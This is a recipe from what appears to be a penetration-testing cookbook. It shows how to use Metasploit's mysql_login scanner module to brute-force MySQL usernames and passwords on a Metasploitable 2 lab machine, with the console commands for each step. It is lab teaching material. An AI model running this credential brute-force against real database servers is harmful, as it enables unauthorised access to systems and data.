    # Exploiting Vulnerabilities


    ## Metasploitable MySQL

    In this recipe, we will explore how to use `Metasploit` to attack a MySQL database
    server using the `MySQL Scanner` module. Being the database of choice for many
    website platforms, including `Drupal` and `Wordpress`, many websites are currently
    using the MySQL database server. This makes it an easy target for the Metasploitable
    MySQL attack!


    ### Getting ready

    The following requirement needs to be fulfilled:

    - A connection to the internal network

    - Metasploitable running in our hacking lab

    - A Wordlist to perform dictionary attack


    ### How to do it...

    Let''s begin our MySQL attack by opening a terminal window:


    1. Open a terminal window.

    2. Launch the `MSFCONSOLE`:

    ```

    msfconsole

    ```

    3. Search for all the available MySQL modules:

    ```

    search mysql

    ```

    158

    ![](images/00152.jpeg)

    Chapter 6

    4. Use the MySQL Scanner module:

    ```

    use auxiliary/scanner/mysql/mysql_login

    ```

    5. Show the available options of the module:

    ```

    show options

    ```

    6. Set `RHOST` to the host of your Metasploitable 2 machine or target:

    ```

    set RHOST 192.168.10.111

    ```

    7. Set your username file location. This is a user file list of your choice:

    ```

    set user_file /root/Desktop/usernames.txt

    ```

    8. Set your password file location. This is a password file list of your choice:

    ```

    set pass_file /root/Desktop/passwords.txt

    ```

    159

    ![](images/00153.jpeg)

    9. Run the exploit:

    ```

    Exploit

    ```

    10. `Metasploit` goes out and tries to enter a combination of all usernames and
    passwords contained in both files. Locate the `+` sign next to the login and password
    combination that works.


    ### How it works...

    In this recipe, we used `Metasploit`''s `MSFCONSOLE` to exploit a MySQL vulnerability
    on our target Metasploitable 2 host. We began by launching the console and searching
    for all known MySQL vulnerabilities. After choosing the MySQL login exploit, which
    allows us to brute force the MySQL login, we set our options and executed the
    exploit. Using the username and password files supplied by the exploit, `Metasploit`
    tries to brute force the MySQL database.


    ### There''s more...

    In this recipe, we used a custom generated username and password file. There are
    many ways to generate the username wordlist and the password file and several
    methods are provided in Chapter 8, Password Attacks.


